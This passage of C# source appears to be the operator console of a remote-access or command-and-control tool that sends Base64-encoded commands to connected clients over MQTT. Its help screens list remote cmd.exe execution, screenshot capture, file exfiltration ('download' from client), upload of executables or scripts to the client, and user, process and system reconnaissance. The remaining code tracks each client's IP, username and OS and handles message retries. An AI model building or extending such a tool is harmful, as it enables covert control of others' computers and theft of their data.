"║  Type 'help <command>' for detailed usage                  ║\r\n" +
"║  Example: help shell                                       ║\r\n" +
"║                                                            ║\r\n" +
"║  ⚠ Only valid commands will be sent to the client         ║\r\n" +
"║  ⚠ All data is Base64 encoded for security                ║\r\n" +
"╚════════════════════════════════════════════════════════════╝\r\n";

            commandBox.AppendText(helpText);
            commandBox.SelectionStart = commandBox.Text.Length;
            commandBox.ScrollToCaret();
        }

        private void ShowCommandHelp(TextBox commandBox, string command)
        {
            string helpText = "";

            switch (command.ToLower())
            {
                case "shell":
                    helpText =
"╔════════════════════════════════════════════════════════════╗\r\n" +
"║ SHELL - Execute Shell Commands                            ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
"║ Usage: shell <command>                                     ║\r\n" +
"║                                                            ║\r\n" +
"║ Examples:                                                  ║\r\n" +
"║   shell ipconfig                                           ║\r\n" +
"║   shell netstat -an                                        ║\r\n" +
"║   shell dir C:\\Users                                       ║\r\n" +
"║   shell ping google.com                                    ║\r\n" +
"║                                                            ║\r\n" +
"║ Note: Executes the command in cmd.exe on Windows          ║\r\n" +
"╚════════════════════════════════════════════════════════════╝\r\n";
                    break;

                case "screenshot":
                    helpText =
"╔════════════════════════════════════════════════════════════╗\r\n" +
"║ SCREENSHOT - Capture Client Screen                        ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
"║ Usage: screenshot                                          ║\r\n" +
"║                                                            ║\r\n" +
"║ Description:                                               ║\r\n" +
"║   Captures the current screen of the client and sends     ║\r\n" +
"║   the image back to the server.                           ║\r\n" +
"║                                                            ║\r\n" +
"║ Example:                                                   ║\r\n" +
"║   screenshot                                               ║\r\n" +
"║                                                            ║\r\n" +
"║ Note: Image will be received and saved automatically      ║\r\n" +
"╚════════════════════════════════════════════════════════════╝\r\n";
                    break;

                case "dir":
                    helpText =
"╔════════════════════════════════════════════════════════════╗\r\n" +
"║ DIR - List Directory Contents                             ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
"║ Usage: dir [path]                                          ║\r\n" +
"║                                                            ║\r\n" +
"║ Examples:                                                  ║\r\n" +
"║   dir                      (current directory)             ║\r\n" +
"║   dir C:\\                  (C drive root)                  ║\r\n" +
"║   dir C:\\Users             (Users folder)                  ║\r\n" +
"║   dir D:\\Documents         (specific path)                 ║\r\n" +
"║                                                            ║\r\n" +
"║ Note: Lists all files and folders in the specified path   ║\r\n" +
"╚════════════════════════════════════════════════════════════╝\r\n";
                    break;

                case "whoami":
                    helpText =
"╔════════════════════════════════════════════════════════════╗\r\n" +
"║ WHOAMI - Get Current User Information                     ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
"║ Usage: whoami                                              ║\r\n" +
"║                                                            ║\r\n" +
"║ Description:                                               ║\r\n" +
"║   Returns information about the currently logged-in user  ║\r\n" +
"║   including username, domain, and privilege level.        ║\r\n" +
"║                                                            ║\r\n" +
"║ Example:                                                   ║\r\n" +
"║   whoami                                                   ║\r\n" +
"║                                                            ║\r\n" +
"║ Returns: DOMAIN\\Username or COMPUTERNAME\\Username         ║\r\n" +
"╚════════════════════════════════════════════════════════════╝\r\n";
                    break;

                case "download":
                    helpText =
"╔════════════════════════════════════════════════════════════╗\r\n" +
"║ DOWNLOAD - Download File from Client                      ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
"║ Usage: download \"filepath\"                                 ║\r\n" +
"║                                                            ║\r\n" +
"║ Examples:                                                  ║\r\n" +
"║   download \"C:\\Users\\Admin\\Desktop\\document.txt\"          ║\r\n" +
"║   download \"C:\\Program Files\\app\\config.ini\"              ║\r\n" +
"║   download \"D:\\My Documents\\report.pdf\"                   ║\r\n" +
"║                                                            ║\r\n" +
"║ Note: ALWAYS use quotes for file paths                    ║\r\n" +
"║       File will be transferred from client to server      ║\r\n" +
"╚════════════════════════════════════════════════════════════╝\r\n";
                    break;

                case "upload":
                    helpText =
"╔════════════════════════════════════════════════════════════╗\r\n" +
"║ UPLOAD - Upload File to Client                            ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
"║ Usage: upload \"source\" \"destination\"                       ║\r\n" +
"║                                                            ║\r\n" +
"║ Examples:                                                  ║\r\n" +
"║   upload \"C:\\tools\\tool.exe\" \"C:\\temp\\tool.exe\"           ║\r\n" +
"║   upload \"C:\\My Files\\config.ini\" \"C:\\App\\config.ini\"     ║\r\n" +
"║   upload \"D:\\script.ps1\" \"C:\\Users\\Admin\\script.ps1\"      ║\r\n" +
"║                                                            ║\r\n" +
"║ Note: ALWAYS use quotes for BOTH paths                    ║\r\n" +
"║       First path: local file on server                    ║\r\n" +
"║       Second path: destination on client                  ║\r\n" +
"╚════════════════════════════════════════════════════════════╝\r\n";
                    break;

                case "tasklist":
                    helpText =
"╔════════════════════════════════════════════════════════════╗\r\n" +
"║ TASKLIST - List Running Processes                         ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
"║ Usage: tasklist                                            ║\r\n" +
"║                                                            ║\r\n" +
"║ Description:                                               ║\r\n" +
"║   Returns a list of all currently running processes       ║\r\n" +
"║   on the client machine including:                        ║\r\n" +
"║   - Process name                                           ║\r\n" +
"║   - Process ID (PID)                                       ║\r\n" +
"║   - Memory usage                                           ║\r\n" +
"║                                                            ║\r\n" +
"║ Example:                                                   ║\r\n" +
"║   tasklist                                                 ║\r\n" +
"╚════════════════════════════════════════════════════════════╝\r\n";
                    break;

                case "systeminfo":
                    helpText =
"╔════════════════════════════════════════════════════════════╗\r\n" +
"║ SYSTEMINFO - Get System Information                       ║\r\n" +
"╠════════════════════════════════════════════════════════════╣\r\n" +
"║ Usage: systeminfo                                          ║\r\n" +
"║                                                            ║\r\n" +
"║ Description:                                               ║\r\n" +
"║   Returns detailed information about the client system:   ║\r\n" +
"║   - Operating System details                              ║\r\n" +
"║   - Computer name and domain                              ║\r\n" +
"║   - Processor information                                 ║\r\n" +
"║   - RAM and memory details                                ║\r\n" +
"║   - Network configuration                                 ║\r\n" +
"║   - System uptime                                          ║\r\n" +
"║                                                            ║\r\n" +
"║ Example:                                                   ║\r\n" +
"║   systeminfo                                               ║\r\n" +
"╚════════════════════════════════════════════════════════════╝\r\n";
                    break;

                default:
                    helpText = $@"
╔════════════════════════════════════════════════════════════╗
║ Unknown command: {command}                                    
╠════════════════════════════════════════════════════════════╣
║ Type 'help' to see all available commands                 ║
╚════════════════════════════════════════════════════════════╝
";
                    break;
            }

            commandBox.AppendText(helpText + "\r\n");
            commandBox.SelectionStart = commandBox.Text.Length;
            commandBox.ScrollToCaret();
        }

        private void TabControl1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Middle || e.Button == MouseButtons.Right)
            {
                for (int i = 1; i < tabControl1.TabPages.Count; i++)
                {
                    Rectangle r = tabControl1.GetTabRect(i);
                    if (r.Contains(e.Location))
                    {
                        CloseClientTab(i);
                        break;
                    }
                }
            }
        }

        private void CloseClientTab(int index)
        {
            if (index == 0) return;

            TabPage tab = tabControl1.TabPages[index];
            string clientId = tab.Tag as string;

            if (!string.IsNullOrEmpty(clientId))
            {
                _clientTabs.Remove(clientId);
            }

            tabControl1.TabPages.RemoveAt(index);
        }

        // ================= CLIENT MANAGEMENT =================

        private void AddOrUpdateClient(string uuid, string ip, string username, string os)
        {
            if (listView1.InvokeRequired)
            {
                listView1.Invoke(new Action(() => AddOrUpdateClient(uuid, ip, username, os)));
                return;
            }

            // Store client info
            if (!_clients.ContainsKey(uuid))
            {
                _clients[uuid] = new ClientInfo { Id = uuid, Username = username };
            }

            ListViewItem existingItem = null;
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[0].Text == uuid)
                {
                    existingItem = item;
                    break;
                }
            }

            if (existingItem != null)
            {
                // Update fields only if provided (not null)
                if (ip != null) existingItem.SubItems[1].Text = ip;
                if (username != null) existingItem.SubItems[2].Text = username;
                if (os != null) existingItem.SubItems[3].Text = os;

                // Always reset timer
                existingItem.SubItems[5].Text = "0";
                existingItem.SubItems[6].Text = "Active";
                existingItem.BackColor = Color.LightGreen;
            }
            else
            {
                // New client - all fields required
                var item = new ListViewItem(uuid);
                item.SubItems.Add(ip ?? "");
                item.SubItems.Add(username ?? "");
                item.SubItems.Add(os ?? "");
                item.SubItems.Add(_currentBroker);
                item.SubItems.Add("0");
                item.SubItems.Add("Active");
                item.BackColor = Color.LightGreen;

                listView1.Items.Add(item);
            }
        }

        private void ResetClientTimer(string uuid)
        {
            if (listView1.InvokeRequired)
            {
                listView1.Invoke(new Action(() => ResetClientTimer(uuid)));
                return;
            }

            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[0].Text == uuid)
                {
                    item.SubItems[5].Text = "0"; // Reset "Last Seen" to 0
                    item.SubItems[6].Text = "Active";
                    item.BackColor = Color.LightGreen;
                    break;
                }
            }
        }

        // ================= SEND METHODS =================

        private async Task SendAck(string clientId, string originalPayload)
        {
            if (_client?.IsConnected != true) return;

            try
            {
                var ackMessage = new MqttApplicationMessageBuilder()
                    .WithTopic($"demo/s2c/{clientId}/ack")
                    .WithPayload(originalPayload)
                    .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce)
                    .Build();

                await _client.PublishAsync(ackMessage, _cts.Token);
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Error sending ACK: {ex.Message}");
            }
        }

        private async Task SendToClientWithRetry(string clientId, string message)
        {
            if (_client?.IsConnected != true)
            {
                return;
            }

            string messageId = Guid.NewGuid().ToString("N").Substring(0, 8);

            // Create the full payload first
            string fullPayload = $"{messageId}|{message}";

            // Encode the ENTIRE payload to Base64
            string encodedPayload = EncodeToBase64(fullPayload);

            var pendingMsg = new PendingMessage
            {
                Id = messageId,
                ClientId = clientId,
                Payload = message,  // Store original message for retry
                Topic = $"demo/s2c/{clientId}",
                SentTime = DateTime.Now,
                RetryCount = 0
            };

            _pendingMessages[messageId] = pendingMsg;

            try
            {
                var msg = new MqttApplicationMessageBuilder()
                    .WithTopic($"demo/s2c/{clientId}")
                    .WithPayload(encodedPayload)  // Send encoded payload
                    .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce)
                    .Build();

                await _client.PublishAsync(msg, _cts.Token);
            }
            catch (Exception ex)
            {
                LogMessage($"✗ Error sending message: {ex.Message}");
            }
        }

        // ================= UI HELPERS =================

        private void LogMessage(string message)
        {
            if (txtLog.InvokeRequired)
            {
                txtLog.Invoke(new Action(() => LogMessage(message)));
                return;
            }

            txtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}\r\n");
            txtLog.SelectionStart = txtLog.Text.Length;
            txtLog.ScrollToCaret();

            if (txtLog.Lines.Length > 500)
            {
                txtLog.Lines = txtLog.Lines.Skip(100).ToArray();
            }
        }

        private void btnClearLog_Click(object sender, EventArgs e)
        {
            txtLog.Clear();
        }

        private void ServerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            _cts.Cancel();
            _updateTimer?.Stop();

            if (_client?.IsConnected == true)
            {
                _client.DisconnectAsync().Wait(TimeSpan.FromSeconds(2));
            }

            _client?.Dispose();
        }
    }

    // Supporting classes
    public class CommandMessage
    {
        public string Message { get; set; }
        public bool IsFromServer { get; set; }
        public DateTime Timestamp { get; set; }
    }

    public class ClientInfo
    {
        public string Id { get; set; }
        public string Username { get; set; }
    }

    public class PendingMessage
    {
        public string Id { get; set; }
        public string ClientId { get; set; }
        public string Payload { get; set; }
        public string Topic { get; set; }
        public DateTime SentTime { get; set; }
        public int RetryCount { get; set; }
        public bool AckReceived { get; set; }
    }
}
public class ClientState
{
    public bool IsExecutingCommand { get; set; }
    public string CurrentCommand { get; set; }
    public DateTime CommandStartTime { get; set; }
}